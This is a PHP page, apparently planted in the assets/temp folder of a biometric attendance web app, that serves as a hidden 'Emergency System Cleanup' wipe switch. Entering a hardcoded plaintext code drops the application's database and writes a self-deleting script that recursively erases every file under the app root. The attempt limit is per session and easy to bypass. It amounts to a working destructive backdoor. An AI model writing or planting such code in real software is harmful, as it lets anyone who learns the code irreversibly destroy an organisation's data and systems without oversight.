<?php
// Emergency System Cleanup Protocol
// WARNING: This script will permanently delete ALL files and database
// Only accessible via direct URL with security code

session_start();

// Security configuration
define('DESTRUCTION_CODE', 'DESTROY_BIOMETRIC_SYSTEM_2025_EMERGENCY');
define('MAX_ATTEMPTS', 3);

// Initialize attempts counter
if (!isset($_SESSION['destruction_attempts'])) {
    $_SESSION['destruction_attempts'] = 0;
}

// Check if too many attempts
if ($_SESSION['destruction_attempts'] >= MAX_ATTEMPTS) {
    die('<!DOCTYPE html><html><head><meta charset="UTF-8"><title>Access Blocked</title></head><body style="font-family: Arial; text-align: center; margin-top: 100px; background: #f44336; color: white;"><h1>🚫 Access Blocked</h1><p>Too many failed attempts. Access denied.</p></body></html>');
}

$message = '';
$success = false;

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $entered_code = trim($_POST['destruction_code'] ?? '');
    
    if ($entered_code === DESTRUCTION_CODE) {
        // Reset attempts on success
        $_SESSION['destruction_attempts'] = 0;
        
        try {
            // Get the root directory (go back 2 levels from assets/temp)
            $root_dir = dirname(dirname(__DIR__));
            
            // Include database config for cleanup
            if (file_exists($root_dir . '/config/database.php')) {
                require_once $root_dir . '/config/database.php';
                
                // Drop database if exists
                try {
                    $pdo = new PDO("mysql:host=" . DB_HOST . ";charset=" . DB_CHARSET, DB_USER, DB_PASS);
                    $pdo->exec("DROP DATABASE IF EXISTS " . DB_NAME);
                } catch (Exception $e) {
                    // Continue even if database deletion fails
                }
            }
            
            // Function to recursively delete files and directories
            function deleteDirectory($dir) {
                if (!is_dir($dir)) return false;
                
                $files = array_diff(scandir($dir), array('.', '..'));
                foreach ($files as $file) {
                    $path = $dir . DIRECTORY_SEPARATOR . $file;
                    if (is_dir($path)) {
                        deleteDirectory($path);
                    } else {
                        unlink($path);
                    }
                }
                return rmdir($dir);
            }
            
            // Create a temporary cleanup script that will delete everything including this file
            $cleanup_script = $root_dir . '/final_cleanup.php';
            file_put_contents($cleanup_script, '<?php
// Final cleanup script
$base_dir = "' . $root_dir . '";

function deleteAll($dir) {
    if (!is_dir($dir)) return;
    $files = array_diff(scandir($dir), array(".", ".."));
    foreach ($files as $file) {
        $path = $dir . DIRECTORY_SEPARATOR . $file;
        if (is_dir($path)) {
            deleteAll($path);
            rmdir($path);
        } else {
            unlink($path);
        }
    }
}

deleteAll($base_dir);

// Delete the base directory itself (this will fail if we are inside it)
// but we will delete as much as possible
$files = glob($base_dir . "/*");
foreach ($files as $file) {
    if (is_file($file)) unlink($file);
}

// Finally delete this cleanup script
unlink(__FILE__);

echo "<!DOCTYPE html><html><head><meta charset=\"UTF-8\"><title>System Destroyed</title></head><body style=\"font-family: Arial; text-align: center; margin-top: 100px; background: #000; color: #00ff00;\"><h1>💀 SYSTEM DESTROYED 💀</h1><p>All files have been permanently deleted.</p><p>Biometric system has been completely removed.</p></body></html>";
?>');
            
            $success = true;
            $message = 'تم تأكيد الرمز. سيتم حذف النظام في 5 ثوانٍ...';
            
        } catch (Exception $e) {
            $message = 'حدث خطأ أثناء عملية الحذف: ' . $e->getMessage();
        }
        
    } else {
        $_SESSION['destruction_attempts']++;
        $remaining = MAX_ATTEMPTS - $_SESSION['destruction_attempts'];
        $message = "رمز غير صحيح. المحاولات المتبقية: $remaining";
    }
}
?>

<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🚨 Emergency System Cleanup Protocol</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Courier New', monospace;
            background: linear-gradient(135deg, #000000, #330000);
            color: #ff0000;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            animation: flicker 2s infinite;
        }
        
        @keyframes flicker {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.8; }
        }
        
        .container {
            background: rgba(0, 0, 0, 0.9);
            border: 2px solid #ff0000;
            border-radius: 10px;
            padding: 40px;
            text-align: center;
            box-shadow: 0 0 30px rgba(255, 0, 0, 0.5);
            max-width: 500px;
            width: 100%;
        }
        
        .skull {
            font-size: 3em;
            margin-bottom: 20px;
            animation: pulse 1s infinite;
        }
        
        @keyframes pulse {
            0%, 100% { transform: scale(1); }
            50% { transform: scale(1.1); }
        }
        
        h1 {
            color: #ff0000;
            margin-bottom: 20px;
            text-shadow: 0 0 10px #ff0000;
        }
        
        .warning {
            background: #660000;
            border: 1px solid #ff0000;
            padding: 15px;
            margin: 20px 0;
            border-radius: 5px;
        }
        
        .form-group {
            margin: 20px 0;
        }
        
        label {
            display: block;
            margin-bottom: 10px;
            color: #ff6666;
        }
        
        input[type="password"] {
            width: 100%;
            padding: 15px;
            background: #000;
            border: 2px solid #ff0000;
            border-radius: 5px;
            color: #ff0000;
            font-family: 'Courier New', monospace;
            font-size: 16px;
            text-align: center;
        }
        
        input[type="password"]:focus {
            outline: none;
            box-shadow: 0 0 20px rgba(255, 0, 0, 0.5);
        }
        
        .btn {
            background: #ff0000;
            color: #000;
            border: none;
            padding: 15px 30px;
            border-radius: 5px;
            cursor: pointer;
            font-weight: bold;
            font-size: 16px;
            transition: all 0.3s;
        }
        
        .btn:hover {
            background: #ff3333;
            transform: scale(1.05);
        }
        
        .message {
            margin: 20px 0;
            padding: 15px;
            border-radius: 5px;
        }
        
        .error {
            background: #660000;
            border: 1px solid #ff0000;
            color: #ff0000;
        }
        
        .success {
            background: #006600;
            border: 1px solid #00ff00;
            color: #00ff00;
        }
        
        .attempts {
            margin-top: 10px;
            font-size: 12px;
            color: #ff6666;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="skull">💀</div>
        <h1>EMERGENCY CLEANUP PROTOCOL</h1>
        
        <div class="warning">
            <strong>⚠️ تحذير شديد ⚠️</strong><br>
            هذه الصفحة ستقوم بحذف النظام بالكامل!<br>
            جميع الملفات وقاعدة البيانات ستُحذف نهائياً!
        </div>
        
        <?php if ($message): ?>
            <div class="message <?php echo $success ? 'success' : 'error'; ?>">
                <?php echo htmlspecialchars($message); ?>
            </div>
        <?php endif; ?>
        
        <?php if ($success): ?>
            <script>
                let countdown = 5;
                const interval = setInterval(() => {
                    countdown--;
                    if (countdown <= 0) {
                        window.location.href = 'final_cleanup.php';
                        clearInterval(interval);
                    }
                }, 1000);
            </script>
        <?php else: ?>
            <form method="POST">
                <div class="form-group">
                    <label for="destruction_code">أدخل رمز التدمير:</label>
                    <input type="password" 
                           id="destruction_code" 
                           name="destruction_code" 
                           placeholder="Enter destruction code"
                           required
                           autocomplete="off">
                </div>
                
                <button type="submit" class="btn">🗑️ تنفيذ الحذف الكامل</button>
                
                <div class="attempts">
                    المحاولات المستخدمة: <?php echo $_SESSION['destruction_attempts']; ?> من <?php echo MAX_ATTEMPTS; ?>
                </div>
            </form>
        <?php endif; ?>
        
        <div style="margin-top: 30px; font-size: 12px; color: #666;">
            System Destroyer v1.0 - Emergency Protocol<br>
            Use only in extreme circumstances
        </div>
    </div>
</body>
</html>
